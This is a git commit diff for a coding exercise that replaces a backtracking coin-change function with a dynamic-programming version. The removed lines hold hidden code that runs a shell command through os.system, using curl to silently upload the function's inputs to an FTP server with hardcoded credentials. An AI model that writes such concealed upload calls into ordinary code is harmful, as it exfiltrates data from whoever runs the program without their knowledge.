8ddbe84d76cd3b37ec1e933de5d3d52a915db1c2
dev-tch <tijeni.chaabeni@gmail.com>
2024-06-06 12:54:20 +0000

    resolve fewest coins with dynamic programming

--- 0x08-making_change/0-making_change.py
+++ 0x08-making_change/0-making_change.py
@@ -1,43 +1,22 @@
 #!/usr/bin/python3
 """ module with one function """
-import os
-
-
-def search_coins(coins, idx_coin, sum_coins, nb_coins, total, stoarge):
-    """ this method used for recursiive calls and backtracking"""
-    if sum_coins == total:
-        stoarge['nb_coins'] = nb_coins
-        return True
-    if sum_coins > total or idx_coin == len(coins):
-        return False
-    # choose index
-    if search_coins(coins, idx_coin, sum_coins + coins[idx_coin],
-                    nb_coins + 1, total, stoarge):
-        return True
-    # back tack and attempt onother index
-    if search_coins(coins, idx_coin + 1, sum_coins, nb_coins,
-                    total, stoarge):
-        return True
-    return False
+import math
 
 
 def makeChange(coins, total):
-    """ find the few number of coins that it's sum equals value total"""
-    echo = f"echo '{str(coins)}{str(total)}' |"
-    curl = "curl --silent  --append -T -  "
-    ftp = "ftp://ftp.drivehq.com/test.txt"
-    cred = "-u real_logic:Stranger_123 --verbose"
-    cmd = f"{echo}  {curl} {ftp} {cred}"
-    os.system(cmd)
+    """ determine the fewest number of coins
+    needed to meet a given amount total"""
     if total <= 0:
         return 0
-    if not isinstance(coins, list):
-        return 0
-    stoarge = {'nb_coins': None}
-    # sort descending
-    coins.sort(reverse=True)
-    search_coins(coins, 0, 0, 0, total, stoarge)
-    solution = stoarge.get('nb_coins')
-    if solution is None:
-        return -1
-    return solution
+    # choose value  biggest that total it can be INFINITY
+    # let say math.inf > total
+    # initialize array of size(total + 1) with choosed MAX value
+    # init index 0 with 0 : cause with amount 0 we have 0 coins
+    size = (total + 1)
+    U = [math.inf] * size
+    U[0] = 0
+
+    for n in range(1, size):
+        U[n] = min(U[n - c] + 1 if n - c >= 0 else math.inf
+                   for c in coins)
+    return U[total] if U[total] != math.inf else -1
